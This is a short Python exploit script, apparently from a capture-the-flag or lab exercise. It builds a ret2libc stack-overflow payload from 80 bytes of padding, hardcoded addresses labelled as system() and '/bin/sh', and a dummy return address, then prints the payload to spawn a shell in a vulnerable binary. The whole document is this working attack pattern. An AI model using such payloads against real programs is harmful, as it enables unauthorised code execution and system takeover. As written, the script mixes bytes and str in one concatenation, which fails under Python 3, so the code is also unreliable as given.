len_buffer = 80
system_addr = "\xd0\xae\xe6\xf7"
return_after_system = "AAAA"
bin_sh_addr = "\xec\x97\xf8\xf7"

payload = (
    b"A" * len_buffer +
    system_addr +
    return_after_system +
    bin_sh_addr
)

print(payload)